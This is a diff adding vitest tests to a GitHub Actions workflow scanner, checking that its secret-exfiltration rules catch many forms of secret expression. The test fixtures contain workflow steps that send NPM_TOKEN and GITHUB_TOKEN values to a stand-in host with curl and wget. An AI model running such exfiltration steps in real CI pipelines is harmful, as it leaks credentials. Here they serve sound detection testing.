@@ -1,6 +1,7 @@
 import { describe, it, expect, beforeEach, afterEach } from "vitest";
 import * as fs from "node:fs";
 import * as path from "node:path";
+import * as os from "node:os";
 import { scanGitHubActionsWorkflows } from "../github-actions-scanner.js";
 import { getBundledFeed } from "../threat-intel.js";
 
@@ -546,6 +547,24 @@ jobs:
     expect(findings.find((f) => f.rule === "GHA_OIDC_WRITE_PERM")?.severity).toBe("medium");
   });
 
+  it("describes GHA_OIDC_WRITE_PERM as the presence check it is", () => {
+    // The rule matches the permission alone. Its text must not imply that it
+    // correlated the permission with third-party actions or outbound calls.
+    writeWorkflow(tempDir, "oidc.yml", `
+on: push
+permissions:
+  id-token: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo deploying
+`);
+    const finding = scanGitHubActionsWorkflows(tempDir).find((f) => f.rule === "GHA_OIDC_WRITE_PERM");
+    expect(finding?.description).not.toMatch(/combined with|third-party|curl/i);
+    expect(finding?.description).toMatch(/does not inspect/i);
+  });
+
   it("should detect cache poisoning via github.head_ref", () => {
     writeWorkflow(tempDir, "cache.yml", `
 on: pull_request
@@ -916,4 +935,235 @@ describe("GHA artifact trust context (v5.23.4)", () => {
     );
     expect(finding?.description).toContain("no matching artifact producer");
   });
+});
+
+describe("GHA_SECRET_EXFIL_MULTILINE: every expression form of a secret reference", () => {
+  let tempDir: string;
+  beforeEach(() => {
+    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-gha-exfil-forms-"));
+  });
+  afterEach(() => {
+    fs.rmSync(tempDir, { recursive: true, force: true });
+  });
+
+  /** One step: `env: T: <value>`, then a curl on line 10. Returns EXFIL lines. */
+  function exfilLinesFor(envValue: string): number[] {
+    writeWorkflow(tempDir, "ci.yml", [
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - env:",
+      `          T: ${envValue}`,
+      "        run: |",
+      '          curl -s -d "$T" https://x.example/collect',
+    ].join("\n"));
+    return scanGitHubActionsWorkflows(tempDir)
+      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
+      .map((f) => f.line ?? -1);
+  }
+
+  it.each([
+    ["dot access", "${{ secrets.NPM_TOKEN }}"],
+    ["bracket access, single quotes", "${{ secrets['NPM_TOKEN'] }}"],
+    ["bracket access, double quotes", '${{ secrets["NPM_TOKEN"] }}'],
+    ["whitespace inside the expression", "${{secrets . NPM_TOKEN}}"],
+    ["a computed index", "${{ secrets[format('{0}_TOKEN', matrix.target)] }}"],
+    ["the whole secrets context via toJSON", "${{ toJSON(secrets) }}"],
+    ["the whole secrets context, bare", "${{ secrets }}"],
+    ["a secret inside a function call", "${{ format('Bearer {0}', secrets.NPM_TOKEN) }}"],
+    ["secrets.GITHUB_TOKEN", "${{ secrets.GITHUB_TOKEN }}"],
+    ["bracket GITHUB_TOKEN", "${{ secrets['GITHUB_TOKEN'] }}"],
+    ["github.token", "${{ github.token }}"],
+    ["bracket github token", "${{ github['token'] }}"],
+  ])("fires on the curl line for %s", (_label, value) => {
+    expect(exfilLinesFor(value)).toEqual([10]);
+  });
+
+  it.each([
+    ["a non-secret context", "${{ github.sha }}"],
+    ["an env reference", "${{ env.BUILD_ID }}"],
+    ["a step output named secrets", "${{ steps.secrets.outputs.value }}"],
+    ["the word outside an expression", "secrets"],
+  ])("does not fire for %s", (_label, value) => {
+    expect(exfilLinesFor(value)).toEqual([]);
+  });
+
+  it("fires for bracket access written directly into the run body", () => {
+    writeWorkflow(tempDir, "ci.yml", [
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - run: |",
+      "          echo \"${{ secrets['NPM_TOKEN'] }}\" > t.txt",
+      "          curl -s --data-binary @t.txt https://x.example/collect",
+    ].join("\n"));
+    const lines = scanGitHubActionsWorkflows(tempDir)
+      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
+      .map((f) => f.line);
+    expect(lines).toEqual([9]);
+  });
+
+  it("stays linear on 5 MiB of unclosed expressions", () => {
+    const unclosed = "${{ secrets ".repeat(Math.ceil((5 * 1024 * 1024) / 12));
+    const started = performance.now();
+    expect(exfilLinesFor(unclosed)).toEqual([]);
+    expect(performance.now() - started).toBeLessThan(15_000);
+  });
+
+  function exfilLinesForWorkflow(lines: string[]): number[] {
+    writeWorkflow(tempDir, "ci.yml", lines.join("\n"));
+    return scanGitHubActionsWorkflows(tempDir)
+      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
+      .map((f) => f.line ?? -1);
+  }
+
+  it("sees a secret in an inline flow-map env at step level", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      '        run: curl -d "$T" https://x.example',
+    ])).toEqual([8]);
+  });
+
+  it("sees a secret in an inline flow-map env at job level", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      '    env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "    steps:",
+      '      - run: curl -d "$T" https://x.example',
+    ])).toEqual([8]);
+  });
+
+  it("sees a secret in an inline flow-map env at workflow level", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      'env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      '      - run: curl -d "$T" https://x.example',
+    ])).toEqual([8]);
+  });
+
+  it("does not see an inline env of another step, another job, or a service container", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  a:",
+      "    runs-on: ubuntu-latest",
+      '    env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "    steps:",
+      "      - run: npm publish",
+      "  b:",
+      "    runs-on: ubuntu-latest",
+      "    services:",
+      "      db:",
+      "        image: postgres:16",
+      '        env: { P: "${{ secrets.DB_PASSWORD }}" }',
+      "    steps:",
+      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "        run: npm publish",
+      "      - env: { T: plain }",
+      '        run: curl -d "$T" https://x.example',
+    ])).toEqual([]);
+  });
+});
+
+describe("GHA_SECRET_CURL / GHA_SECRET_WGET / GHA_ENV_EXFIL: every expression form of a secret reference", () => {
+  let tempDir: string;
+  beforeEach(() => {
+    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-gha-line-forms-"));
+  });
+  afterEach(() => {
+    fs.rmSync(tempDir, { recursive: true, force: true });
+  });
+
+  const RULES = new Set(["GHA_SECRET_CURL", "GHA_SECRET_WGET", "GHA_ENV_EXFIL", "GHA_SECRET_EXFIL_MULTILINE"]);
+
+  /** Three one-line steps, each carrying the expression; returns "RULE@line" sorted. */
+  function reportFor(expr: string): { keys: string[]; matches: string[] } {
+    writeWorkflow(tempDir, "ci.yml", [
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      `      - run: curl -s -H X-Key:${expr} https://x.example`,
+      `      - run: echo ${expr} | wget --post-file=- https://x.example`,
+      `      - run: wget --header=X:${expr} https://x.example`,
+    ].join("\n"));
+    const found = scanGitHubActionsWorkflows(tempDir).filter((f) => RULES.has(f.rule));
+    return {
+      keys: found.map((f) => `${f.rule}@${f.line}`).sort(),
+      matches: found.map((f) => f.match ?? ""),
+    };
+  }
+
+  const DOT = reportFor.bind(null, "${{ secrets.NPM_TOKEN }}");
+
+  it("reports the dot form on all three rules (control)", () => {
+    const { keys, matches } = DOT();
+    expect(keys).toEqual(["GHA_ENV_EXFIL@7", "GHA_SECRET_CURL@7", "GHA_SECRET_WGET@8", "GHA_SECRET_WGET@9"]);
+    // The dot form is left as written, so its match is the pattern's own match.
+    for (const m of matches) expect(m).not.toMatch(/^- run:/);
+  });
+
+  it.each([
+    ["bracket access, single quotes", "${{ secrets['NPM_TOKEN'] }}"],
+    ["bracket access, double quotes", '${{ secrets["NPM_TOKEN"] }}'],
+    ["whitespace inside the expression", "${{secrets . NPM_TOKEN}}"],
+    ["a computed index", "${{ secrets[format('{0}_TOKEN', matrix.target)] }}"],
+    ["the whole secrets context via toJSON", "${{ toJSON(secrets) }}"],
+    ["the whole secrets context, bare", "${{ secrets }}"],
+    ["a secret inside a function call", "${{ format('Bearer {0}', secrets.NPM_TOKEN) }}"],
+    ["bracket GITHUB_TOKEN", "${{ secrets['GITHUB_TOKEN'] }}"],
+    ["github.token", "${{ github.token }}"],
+    ["bracket github token", "${{ github['token'] }}"],
+  ])("reports %s exactly as the dot form, with the file's own text as the match", (_label, expr) => {
+    const dotKeys = DOT().keys;
+    const { keys, matches } = reportFor(expr);
+    expect(keys).toEqual(dotKeys);
+    // The match shows the workflow's own text, not a rewritten expression.
+    for (const m of matches) expect(m).toContain(expr);
+  });
+
+  it.each([
+    ["a non-secret context", "${{ github.sha }}"],
+    ["a step output named secrets", "${{ steps.secrets.outputs.value }}"],
+  ])("reports nothing for %s", (_label, expr) => {
+    expect(reportFor(expr).keys).toEqual([]);
+  });
+
+  // reportFor writes the value on three lines, so a third of 5 MiB each.
+  it("stays linear on 5 MiB of expressions and on unclosed ones", () => {
+    const perLine = (5 * 1024 * 1024) / 3;
+    const many = "${{ github['token'] }}".repeat(Math.ceil(perLine / 22));
+    let started = performance.now();
+    reportFor(many);
+    expect(performance.now() - started).toBeLessThan(15_000);
+
+    const unclosed = "${{ secrets ".repeat(Math.ceil(perLine / 12));
+    started = performance.now();
+    expect(reportFor(unclosed).keys).toEqual([]);
+    expect(performance.now() - started).toBeLessThan(15_000);
+  }, 60_000);
 });
